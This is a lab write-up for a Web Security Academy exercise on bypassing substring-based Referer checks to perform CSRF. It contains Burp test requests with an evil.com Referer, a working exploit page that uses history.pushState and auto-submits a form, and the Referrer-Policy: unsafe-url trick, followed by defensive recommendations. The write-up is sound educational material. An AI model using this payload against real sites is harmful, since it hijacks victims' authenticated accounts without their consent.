# CSRF – Broken Referer Validation

(**Web Security Academy**)

This lab demonstrates how **naive Referer validation logic** can be bypassed when an application merely checks whether the expected domain **appears anywhere in the Referer string**, rather than validating the actual origin.

---

## Lab: CSRF with Broken Referer Validation

**Category:** Cross-Site Request Forgery (CSRF)
**Protection Mechanism:** Referer header validation (broken)
**Difficulty:** Practitioner
**Tools Used:** Burp Suite
**Status:** Solved

---

## Vulnerability Overview

The application attempts to block CSRF by verifying that the `Referer` header contains its own domain.

However, the validation logic is flawed:

* Requests are rejected if the Referer domain is clearly different
* Requests are **accepted if the expected domain appears anywhere in the Referer**, even as part of a query string

This allows attackers to **forge an acceptable Referer header** without originating from the legitimate site.

---

## Target Functionality

**Endpoint:**

```http
POST /my-account/change-email
```

**Parameter:**

* `email`

There is **no CSRF token**, so the application relies entirely on Referer validation.

---

## Analyzing the Referer Validation

### 1. Baseline Test

From Burp Proxy → HTTP history:

* Legitimate request includes:

```http
Referer: https://YOUR-LAB-ID.web-security-academy.net/my-account
```

Request is accepted.

---

### 2. Modified Referer Domain

In Burp Repeater:

```http
Referer: https://evil.com
```

Result:  **Request rejected**

---

### 3. Bypass via Query String Injection

Appending the legitimate domain to an arbitrary URL:

```http
Referer: https://evil.com?YOUR-LAB-ID.web-security-academy.net
```

Result:  **Request accepted**

This confirms that the application uses a weak check similar to:

```text
IF Referer contains expected-domain:
    allow request
```

---

## Building the CSRF Exploit

### Core Idea

* Use `history.pushState()` to manipulate the page URL
* Ensure the target domain appears in the URL query string
* This value is reflected in the Referer header
* Override browser behavior that strips query strings from Referer headers

---

### Exploit HTML (Exploit Server)

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="broken-referer@web-security-academy.net">
</form>

<script>
    history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net");
    document.forms[0].submit();
</script>
```

---

## Dealing with Browser Referer Stripping

Modern browsers often remove query strings from Referer headers by default.

To force the full URL (including query string) to be sent, add the following to the **Head** section of the exploit server:

```http
Referrer-Policy: unsafe-url
```

Note:

* The header name must be **Referrer-Policy**
* This is different from the `Referer` header spelling

---

## Why the Exploit Works

* Browser sends full Referer including query string
* Referer contains expected domain substring
* Server validation passes
* Session cookie is included automatically
* Email address is changed without user consent

---

## Attack Flow

1. Victim is logged in
2. Victim visits attacker-controlled exploit page
3. Browser submits forged POST request
4. Referer header includes target domain in query string
5. Server performs substring match
6. CSRF protection is bypassed
7. Victim’s email is changed

---

## Verification & Delivery

* Tested exploit using **View exploit**
* Confirmed email change on my own account
* Updated email address to avoid collision
* Clicked **Deliver exploit to victim**
* Lab marked as **Solved**

---

## Impact

An attacker can:

* Bypass Referer-based CSRF protections
* Perform authenticated actions on behalf of victims
* Abuse trust in flawed origin validation

**Severity:** High

---

## Key Takeaways

* Substring matching for security checks is dangerous
* Referer headers are attacker-influenced
* Browsers can be instructed to loosen privacy protections
* CSRF tokens remain the gold standard
* Defense-in-depth is essential

---

## Secure Design Recommendations

* Use cryptographically strong CSRF tokens
* Validate the `Origin` header instead of `Referer`
* Reject requests with missing or malformed origin headers
* Avoid substring-based validation logic
* Combine multiple CSRF defenses

---

## Final Summary

* Referer validation relied on weak string matching
* Attacker injected trusted domain into query string
* Browser forced to send full Referer
* CSRF attack succeeded
* Email address was changed
* Lab successfully solved
 
